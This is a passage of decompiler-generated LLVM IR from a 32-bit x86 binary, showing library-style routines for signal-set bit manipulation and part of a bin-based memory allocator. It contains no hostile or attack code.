  br i1 %v1_8052605, label %dec_label_pc_8052661, label %dec_label_pc_8052607

dec_label_pc_8052607:                             ; preds = %dec_label_pc_80525e4
  %v0_8052607 = load i32, i32* @edx, align 4
  %v0_805260e = load i32, i32* @ebp, align 4
  store i32 %v0_805260e, i32* %stack_var_-108, align 4
  %v3_805260f = inttoptr i32 %tmp to i16*
  %v4_805260f = call i32 @function_8051e5c(i16* %v3_805260f, i32 4, i32 %v0_8052607)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8052618 = load i32, i32* @edi, align 4
  store i32 %v0_8052618, i32* %arg2, align 4
  %v1_805261a = add i32 %tmp18, 8
  %v2_805261a = inttoptr i32 %v1_805261a to i32*
  store i32 2, i32* %v2_805261a, align 4
  %v0_8052621 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052621 = add i32 %v0_8052621, 12
  %v2_8052621 = inttoptr i32 %v1_8052621 to i32*
  store i32 4, i32* %v2_8052621, align 4
  %v3_8052628 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8052628, i32* %edx.global-to-local, align 4
  %v1_805262c = load i32, i32* %eax.global-to-local, align 4
  %v2_805262c = add i32 %v1_805262c, 16
  %v3_805262c = inttoptr i32 %v2_805262c to i32*
  store i32 %v3_8052628, i32* %v3_805262c, align 4
  %v1_8052633 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052633 = add i32 %v1_8052633, 4
  %v3_8052633 = inttoptr i32 %v2_8052633 to i32*
  store i32 %v1_805243e, i32* %v3_8052633, align 4
  %v2_8052636 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052636, i32* %eax.global-to-local, align 4
  %v3_8052637 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052637, i32* %stack_var_-108, align 4
  %v1_805263b = call i32 @function_8053391(i32 %v3_8052637)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805236f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_80523bd, align 4
  br label %dec_label_pc_805265c

dec_label_pc_805265c:                             ; preds = %dec_label_pc_8052661, %dec_label_pc_805254b, %dec_label_pc_8052607
  br label %dec_label_pc_8052686

dec_label_pc_8052661:                             ; preds = %dec_label_pc_80525e4
  %v3_8052664 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052664, i32* %stack_var_-108, align 4
  %v1_8052668 = call i32 @function_8053391(i32 %v3_8052664)
  store i32 1, i32* %v1_80523bd, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805265c

dec_label_pc_8052681:                             ; preds = %dec_label_pc_805242b, %dec_label_pc_805240f, %dec_label_pc_8052403, %dec_label_pc_80523f0, %dec_label_pc_80523e4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052686

dec_label_pc_8052686:                             ; preds = %dec_label_pc_80523d0, %dec_label_pc_80523c9, %dec_label_pc_8052385, %dec_label_pc_805235c, %dec_label_pc_805265c, %dec_label_pc_805251e, %dec_label_pc_8052478, %dec_label_pc_8052681
  store i32 %v0_805235f, i32* @ebx, align 4
  store i32 %v0_805235e, i32* @esi, align 4
  store i32 %v0_805235d, i32* @edi, align 4
  store i32 %v0_805235c, i32* @ebp, align 4
  %v0_805268d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805268d

; uselistorder directives
  uselistorder i32 %v2_80524c0, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_8052445, { 1, 0, 2 }
  uselistorder i32 %v1_805243e, { 2, 1, 0 }
  uselistorder i32 %v1_805242b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80523f4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_80523dd, { 1, 0 }
  uselistorder i32 %v2_80523bd, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80523bd, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805236f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 (i8*, i32)* @function_8055274, { 1, 0 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052686, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805265c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523f0, { 1, 0 }
}

define i32 @function_8052690(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052690:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80526ab = ptrtoint i32* %stack_var_-12 to i32
  %v2_80526b2 = call i32 @function_80543ac(i32 3, i32 %v2_80526ab)
  ret i32 %v2_80526b2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80526e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80526e8:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052713 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805271a = call i32 @function_80543ac(i32 15, i32 %v2_8052713)
  ret i32 %v2_805271a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8052724(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052724:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052747 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805274e = call i32 @function_80543ac(i32 10, i32 %v2_8052747)
  ret i32 %v2_805274e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8052758(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052758:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805277b = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052782 = call i32 @function_80543ac(i32 9, i32 %v2_805277b)
  ret i32 %v2_8052782

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80527d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80527d0:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80527fb = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052802 = call i32 @function_80543ac(i32 14, i32 %v2_80527fb)
  ret i32 %v2_8052802

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_805280c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805280c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052827 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805282e = call i32 @function_80543ac(i32 1, i32 %v2_8052827)
  ret i32 %v2_805282e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80543ac, { 2, 1, 3, 4, 5, 0 }
}

define i32 @function_8052838(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052838:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052850, label %dec_label_pc_8052843

dec_label_pc_8052843:                             ; preds = %dec_label_pc_8052838
  %v1_8052843 = add i32 %arg1, -64
  %v3_8052843 = sub i32 63, %arg1
  %v4_8052843 = and i32 %v3_8052843, %arg1
  %v5_8052843 = icmp slt i32 %v4_8052843, 0
  %v6_8052843 = icmp eq i32 %v1_8052843, 0
  %v7_8052843 = icmp slt i32 %v1_8052843, 0
  %v3_8052846 = icmp eq i1 %v7_8052843, %v5_8052843
  %v4_8052846 = icmp eq i1 %v6_8052843, false
  %v5_8052846 = and i1 %v4_8052846, %v3_8052846
  br i1 %v5_8052846, label %dec_label_pc_8052850, label %dec_label_pc_8052848

dec_label_pc_8052848:                             ; preds = %dec_label_pc_8052843
  %v4_805284b = call i32 @function_8052954(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052850

dec_label_pc_8052850:                             ; preds = %dec_label_pc_8052843, %dec_label_pc_8052838, %dec_label_pc_8052848
  %v1_8052850 = call i32 @function_8050f90(i32 ptrtoint (i32* @0 to i32))
  %v1_8052855 = inttoptr i32 %v1_8052850 to i32*
  store i32 22, i32* %v1_8052855, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052843, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052850, { 2, 0, 1 }
}

define i32 @function_8052864(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052864:
  %v3_8052872 = inttoptr i32 %arg1 to i8*
  %v4_8052872 = call i32 @function_8051e84(i8* %v3_8052872, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8052880(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052880:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052880 = load i32, i32* @ebx, align 4
  %v15_8052881 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052895 = icmp eq i32 %arg2, -1
  br i1 %v10_8052895, label %dec_label_pc_80528a3, label %dec_label_pc_805289a

dec_label_pc_805289a:                             ; preds = %dec_label_pc_8052880
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80528a3, label %dec_label_pc_805289e

dec_label_pc_805289e:                             ; preds = %dec_label_pc_805289a
  %v7_80528a1 = icmp sgt i32 %arg1, 64
  br i1 %v7_80528a1, label %dec_label_pc_80528a3, label %dec_label_pc_80528b0

dec_label_pc_80528a3:                             ; preds = %dec_label_pc_805289e, %dec_label_pc_805289a, %dec_label_pc_8052880
  %v1_80528a3 = call i32 @function_8050f90(i32 %v0_8052880)
  store i32 %v1_80528a3, i32* %eax.global-to-local, align 4
  %v1_80528a8 = inttoptr i32 %v1_80528a3 to i32*
  store i32 22, i32* %v1_80528a8, align 4
  br label %dec_label_pc_8052924

dec_label_pc_80528b0:                             ; preds = %dec_label_pc_805289e
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528be

dec_label_pc_80528be:                             ; preds = %dec_label_pc_80528be.dec_label_pc_80528be_crit_edge, %dec_label_pc_80528b0
  %v0_80528be = phi i32 [ %v15_8052881, %dec_label_pc_80528b0 ], [ %v0_80528be.pre, %dec_label_pc_80528be.dec_label_pc_80528be_crit_edge ]
  %v1_80528c917 = phi i32 [ 31, %dec_label_pc_80528b0 ], [ %v1_80528c9, %dec_label_pc_80528be.dec_label_pc_80528be_crit_edge ]
  %v2_80528be = mul i32 %v1_80528c917, 4
  %v3_80528be = add i32 %v2_80528be, 160
  %v4_80528be = add i32 %v3_80528be, %v0_80528be
  %v5_80528be = inttoptr i32 %v4_80528be to i32*
  store i32 0, i32* %v5_80528be, align 4
  %v0_80528c9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80528c9 = add i32 %v0_80528c9.pre, -1
  %v9_80528c9 = icmp slt i32 %v1_80528c9, 0
  store i32 %v1_80528c9, i32* %eax.global-to-local, align 4
  %v1_80528ca = icmp eq i1 %v9_80528c9, false
  br i1 %v1_80528ca, label %dec_label_pc_80528be.dec_label_pc_80528be_crit_edge, label %dec_label_pc_80528cc

dec_label_pc_80528be.dec_label_pc_80528be_crit_edge: ; preds = %dec_label_pc_80528be
  %v0_80528be.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80528be

dec_label_pc_80528cc:                             ; preds = %dec_label_pc_80528be
  %v0_80528cc = load i32, i32* @edx, align 4
  %v2_80528cf = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_80528cf, i32* %eax.global-to-local, align 4
  %v4_80528d7 = call i32 @function_8052954(i32 %v2_80528cf, i32 %arg1, i32 %v0_80528cc, i32 %v0_80528cc)
  store i32 %v4_80528d7, i32* %eax.global-to-local, align 4
  %v2_80528df = icmp slt i32 %v4_80528d7, 0
  br i1 %v2_80528df, label %dec_label_pc_8052924, label %dec_label_pc_80528e3

dec_label_pc_80528e3:                             ; preds = %dec_label_pc_80528cc
  %v4_80528eb = call i32 @function_8052930(i32 ptrtoint (i32* @global_var_8064b60.340 to i32), i32 %arg1, i32 %v4_80528d7, i32 %v4_80528d7)
  %v2_8052904 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052909 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052909, i32* %eax.global-to-local, align 4
  %v4_8052912 = call i32 @function_805429b(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052904)
  store i32 %v4_8052912, i32* %eax.global-to-local, align 4
  %v2_805291a = icmp slt i32 %v4_8052912, 0
  br i1 %v2_805291a, label %dec_label_pc_8052924, label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_80528e3
  %v3_805291e = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052927

dec_label_pc_8052924:                             ; preds = %dec_label_pc_80528e3, %dec_label_pc_80528cc, %dec_label_pc_80528a3
  br label %dec_label_pc_8052927

dec_label_pc_8052927:                             ; preds = %dec_label_pc_805291e, %dec_label_pc_8052924
  %storemerge = phi i32 [ -1, %dec_label_pc_8052924 ], [ %v3_805291e, %dec_label_pc_805291e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8052880, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80528c9, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8052927, { 1, 0 }
}

define i32 @function_8052930(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052930:
  %v1_805293e = add i32 %arg2, -1
  %v1_8052941 = urem i32 %v1_805293e, 32
  %v2_8052941 = icmp eq i32 %v1_8052941, 0
  %v2_8052944 = udiv i32 %v1_805293e, 32
  br i1 %v2_8052941, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052930
  %v5_8052947 = shl i32 1, %v1_8052941
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052930, %bb
  %v6_8052949 = phi i32 [ 1, %dec_label_pc_8052930 ], [ %v5_8052947, %bb ]
  %v2_8052949 = mul nuw nsw i32 %v2_8052944, 4
  %v3_8052949 = add i32 %v2_8052949, %arg1
  %v4_8052949 = inttoptr i32 %v3_8052949 to i32*
  %v5_8052949 = load i32, i32* %v4_8052949, align 4
  %v7_8052949 = and i32 %v5_8052949, %v6_8052949
  %v8_8052949 = icmp eq i32 %v7_8052949, 0
  %v1_805294d = icmp eq i1 %v8_8052949, false
  %v2_805294d = zext i1 %v1_805294d to i32
  ret i32 %v2_805294d

; uselistorder directives
  uselistorder i32 %v1_8052941, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052954(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052954:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052954 = load i32, i32* @ebx, align 4
  store i32 %v0_8052954, i32* %stack_var_-4, align 4
  %v1_8052962 = add i32 %arg2, -1
  %v1_8052965 = urem i32 %v1_8052962, 32
  %v2_8052965 = icmp eq i32 %v1_8052965, 0
  store i32 %v1_8052965, i32* @ecx, align 4
  br i1 %v2_8052965, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8052954
  %v5_8052968 = shl i32 1, %v1_8052965
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8052954, %bb
  %v6_805296d = phi i32 [ 1, %dec_label_pc_8052954 ], [ %v5_8052968, %bb ]
  %v2_805296a = udiv i32 %v1_8052962, 32
  store i32 %v2_805296a, i32* @edx, align 4
  %v2_805296d = mul nuw nsw i32 %v2_805296a, 4
  %v3_805296d = add i32 %v2_805296d, %arg1
  %v4_805296d = inttoptr i32 %v3_805296d to i32*
  %v5_805296d = load i32, i32* %v4_805296d, align 4
  %v7_805296d = or i32 %v5_805296d, %v6_805296d
  store i32 %v7_805296d, i32* %v4_805296d, align 4
  %v2_8052972 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052972, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805296a, { 1, 0 }
  uselistorder i32 %v1_8052965, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8052974(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052974:
  %v1_8052982 = add i32 %arg2, -1
  %v1_8052985 = urem i32 %v1_8052982, 32
  %v2_8052985 = icmp eq i32 %v1_8052985, 0
  br i1 %v2_8052985, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8052974
  %v4_8052988 = shl i32 -2, %v1_8052985
  %v5_8052988 = sub nsw i32 32, %v1_8052985
  %v6_8052988 = lshr i32 -2, %v5_8052988
  %v7_8052988 = or i32 %v6_8052988, %v4_8052988
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8052974, %bb
  %v6_805298d = phi i32 [ -2, %dec_label_pc_8052974 ], [ %v7_8052988, %bb ]
  %v2_805298a = udiv i32 %v1_8052982, 32
  %v2_805298d = mul nuw nsw i32 %v2_805298a, 4
  %v3_805298d = add i32 %v2_805298d, %arg1
  %v4_805298d = inttoptr i32 %v3_805298d to i32*
  %v5_805298d = load i32, i32* %v4_805298d, align 4
  %v7_805298d = and i32 %v5_805298d, %v6_805298d
  store i32 %v7_805298d, i32* %v4_805298d, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052985, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8052994() local_unnamed_addr {
dec_label_pc_8052994:
  %v0_8052994 = load i32, i32* @eax, align 4
  %v6_80529a7 = icmp ugt i32 %v0_8052994, 16777215
  br i1 %v6_80529a7, label %dec_label_pc_80529b8, label %dec_label_pc_80529a9

dec_label_pc_80529a9:                             ; preds = %dec_label_pc_8052994
  %tmp = icmp ult i32 %v0_8052994, 256
  %v2_8052996 = udiv i32 %v0_8052994, 256
  %v2_80529a9 = call i32 @llvm.ctlz.i32(i32 %v2_8052996, i1 true)
  %v3_80529a9 = xor i32 %v2_80529a9, 31
  %v5_80529a9 = select i1 %tmp, i32 95, i32 %v3_80529a9
  %v1_80529ac = add nuw nsw i32 %v5_80529a9, 6
  store i32 %v1_80529ac, i32* @ecx, align 4
  %v2_80529af = urem i32 %v1_80529ac, 32
  %v4_80529af = icmp eq i32 %v2_80529af, 0
  br i1 %v4_80529af, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80529a9
  %v5_80529af = lshr i32 %v0_8052994, %v2_80529af
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80529a9, %bb
  %v0_80529b1 = phi i32 [ %v0_8052994, %dec_label_pc_80529a9 ], [ %v5_80529af, %bb ]
  %v1_80529b1 = urem i32 %v0_80529b1, 4
  %v2_80529b4 = mul nuw nsw i32 %v5_80529a9, 4
  %v3_80529b4 = or i32 %v1_80529b1, 32
  %v4_80529b4 = add nuw nsw i32 %v3_80529b4, %v2_80529b4
  br label %dec_label_pc_80529b8

dec_label_pc_80529b8:                             ; preds = %dec_label_pc_8052994, %bb4
  %v0_80529b9 = phi i32 [ 95, %dec_label_pc_8052994 ], [ %v4_80529b4, %bb4 ]
  ret i32 %v0_80529b9

; uselistorder directives
  uselistorder i32 %v2_80529af, { 1, 0 }
  uselistorder i32 %v0_8052994, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80529b8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_80529ba(i32 %arg1) local_unnamed_addr {
dec_label_pc_80529ba:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80529ba = load i32, i32* @ebp, align 4
  %v0_80529bb = load i32, i32* @edi, align 4
  %v0_80529bc = load i32, i32* @esi, align 4
  %v0_80529bd = load i32, i32* @ebx, align 4
  store i32 %v0_80529bd, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_80529cf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80529cf, i32* @eax, align 4
  store i32 %v2_80529cf, i32* %stack_var_-92, align 4
  %v2_80529d4 = call i32 @function_805405a(i32 %v2_80529cf, i32 134561879)
  store i32 %v2_80529d4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e770.341 to i32), i32* %stack_var_-92, align 4
  %v1_80529e0 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e770.341 to i32))
  store i32 %v1_80529e0, i32* %eax.global-to-local, align 4
  %v0_80529e8 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_80529e8, -32
  br i1 %tmp, label %dec_label_pc_80529ff, label %dec_label_pc_80529ed

dec_label_pc_80529ed:                             ; preds = %dec_label_pc_80529ba
  %v0_80529ed = load i32, i32* %stack_var_-92, align 4
  %v1_80529ed = call i32 @function_8050f90(i32 %v0_80529ed)
  store i32 %v1_80529ed, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80529f4 = inttoptr i32 %v1_80529ed to i32*
  store i32 12, i32* %v1_80529f4, align 4
  br label %dec_label_pc_8053152

dec_label_pc_80529ff:                             ; preds = %dec_label_pc_80529ba
  %v1_80529ff = add i32 %v0_80529e8, 11
  %tmp135 = icmp ult i32 %v1_80529ff, 16
  br i1 %tmp135, label %dec_label_pc_8052a16, label %dec_label_pc_8052a0f

dec_label_pc_8052a0f:                             ; preds = %dec_label_pc_80529ff
  %v1_8052a0f = and i32 %v1_80529ff, -8
  br label %dec_label_pc_8052a16

dec_label_pc_8052a16:                             ; preds = %dec_label_pc_80529ff, %dec_label_pc_8052a0f
  %storemerge132 = phi i32 [ %v1_8052a0f, %dec_label_pc_8052a0f ], [ %v1_80529ff, %dec_label_pc_80529ff ]
  %v1_8052db6 = phi i32 [ %v1_8052a0f, %dec_label_pc_8052a0f ], [ 16, %dec_label_pc_80529ff ]
  store i32 %storemerge132, i32* %eax.global-to-local, align 4
  %v0_8052a16 = load i8, i8* @global_var_8064be0.342, align 1
  %v1_8052a16 = sext i8 %v0_8052a16 to i32
  store i32 %v1_8052a16, i32* @ebx, align 4
  %v3_8052a1c = urem i8 %v0_8052a16, 2
  %v4_8052a1c = icmp eq i8 %v3_8052a1c, 0
  %v1_8052a1f = icmp eq i1 %v4_8052a1c, false
  br i1 %v1_8052a1f, label %dec_label_pc_8052a3e, label %dec_label_pc_8052a21

dec_label_pc_8052a21:                             ; preds = %dec_label_pc_8052a16
  %v2_8052a21 = icmp eq i8 %v0_8052a16, 0
  %v1_8052a23 = icmp eq i1 %v2_8052a21, false
  br i1 %v1_8052a23, label %dec_label_pc_8052d21, label %dec_label_pc_8052a29

dec_label_pc_8052a29:                             ; preds = %dec_label_pc_8052a21
  store i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32* %stack_var_-92, align 4
  %v2_8052a31 = call i32 @function_80531e9(i32* bitcast (i8* @global_var_8064be0.342 to i32*))
  store i32 %v2_8052a31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d21

dec_label_pc_8052a3e:                             ; preds = %dec_label_pc_8052a16
  %v11_8052a3e = trunc i32 %v1_8052db6 to i8
  %v8_8052a42 = icmp ugt i8 %v11_8052a3e, %v0_8052a16
  br i1 %v8_8052a42, label %dec_label_pc_8052a5f, label %dec_label_pc_8052a44

dec_label_pc_8052a44:                             ; preds = %dec_label_pc_8052a3e
  %v2_8052a48 = udiv i32 %v1_8052db6, 2
  store i32 %v2_8052a48, i32* %eax.global-to-local, align 4
  %v1_8052a4a = add i32 %v2_8052a48, ptrtoint (i8* @global_var_8064be0.342 to i32)
  store i32 %v1_8052a4a, i32* @ecx, align 4
  %v1_8052a50 = add i32 %v2_8052a48, add (i32 ptrtoint (i8* @global_var_8064be0.342 to i32), i32 -4)
  %v2_8052a50 = inttoptr i32 %v1_8052a50 to i32*
  %v3_8052a50 = load i32, i32* %v2_8052a50, align 4
  store i32 %v3_8052a50, i32* @edx, align 4
  %v1_8052a53 = icmp eq i32 %v3_8052a50, 0
  br i1 %v1_8052a53, label %dec_label_pc_8052a5f, label %dec_label_pc_8052a57

dec_label_pc_8052a57:                             ; preds = %dec_label_pc_8052a44
  %v1_8052a57 = add i32 %v3_8052a50, 8
  %v2_8052a57 = inttoptr i32 %v1_8052a57 to i32*
  %v3_8052a57 = load i32, i32* %v2_8052a57, align 4
  store i32 %v3_8052a57, i32* %eax.global-to-local, align 4
  store i32 %v3_8052a57, i32* %v2_8052a50, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052a5f:                             ; preds = %dec_label_pc_8052a44, %dec_label_pc_8052a3e
  %v8_8052a5f = icmp ult i32 %v1_8052db6, 255
  %v6_8052a67 = icmp ugt i32 %v1_8052db6, 255
  store i32 %v1_8052db6, i32* @eax, align 4
  br i1 %v6_8052a67, label %dec_label_pc_8052aa0, label %dec_label_pc_8052a69

dec_label_pc_8052a69:                             ; preds = %dec_label_pc_8052a5f
  %v2_8052a6d = udiv i32 %v1_8052db6, 8
  store i32 %v2_8052a6d, i32* %eax.global-to-local, align 4
  %v1_8052a70 = mul nuw i32 %v2_8052a6d, 8
  %v2_8052a70 = add i32 %v1_8052a70, ptrtoint (i32* @global_var_8064c0c.343 to i32)
  store i32 %v2_8052a70, i32* @ecx, align 4
  %v1_8052a7b = add i32 %v1_8052a70, add (i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), i32 12)
  %v2_8052a7b = inttoptr i32 %v1_8052a7b to i32*
  %v3_8052a7b = load i32, i32* %v2_8052a7b, align 4
  store i32 %v3_8052a7b, i32* @edx, align 4
  %v12_8052a7e = icmp eq i32 %v3_8052a7b, %v2_8052a70
  br i1 %v12_8052a7e, label %dec_label_pc_8052b9c.preheader, label %dec_label_pc_8052a86

dec_label_pc_8052a86:                             ; preds = %dec_label_pc_8052a69
  store i32 %v1_8052db6, i32* %ebx.global-to-local, align 4
  %v1_8052a8a = add i32 %v3_8052a7b, 12
  %v2_8052a8a = inttoptr i32 %v1_8052a8a to i32*
  %v3_8052a8a = load i32, i32* %v2_8052a8a, align 4
  store i32 %v3_8052a8a, i32* %eax.global-to-local, align 4
  %v2_8052a8d = or i32 %v1_8052db6, 4
  %v3_8052a8d = add i32 %v3_8052a7b, %v2_8052a8d
  %v4_8052a8d = inttoptr i32 %v3_8052a8d to i32*
  %v5_8052a8d = load i32, i32* %v4_8052a8d, align 4
  %v6_8052a8d = or i32 %v5_8052a8d, 1
  store i32 %v6_8052a8d, i32* %v4_8052a8d, align 4
  %v0_8052a92 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a92 = load i32, i32* @ecx, align 4
  %v2_8052a92 = add i32 %v1_8052a92, 12
  %v3_8052a92 = inttoptr i32 %v2_8052a92 to i32*
  store i32 %v0_8052a92, i32* %v3_8052a92, align 4
  %v0_8052a95 = load i32, i32* @ecx, align 4
  %v1_8052a95 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a95 = add i32 %v1_8052a95, 8
  %v3_8052a95 = inttoptr i32 %v2_8052a95 to i32*
  store i32 %v0_8052a95, i32* %v3_8052a95, align 4
  br label %dec_label_pc_8052a98

dec_label_pc_8052a98:                             ; preds = %dec_label_pc_8052a57, %dec_label_pc_8052a86
  %v0_8052a98 = load i32, i32* @edx, align 4
  %v1_8052a98 = add i32 %v0_8052a98, 8
  store i32 %v1_8052a98, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053141

dec_label_pc_8052aa0:                             ; preds = %dec_label_pc_8052a5f
  %v0_8052aa4 = call i32 @function_8052994()
  store i32 %v0_8052aa4, i32* %eax.global-to-local, align 4
  %v3_8052aa9 = and i8 %v0_8052a16, 2
  %v4_8052aa9 = icmp eq i8 %v3_8052aa9, 0
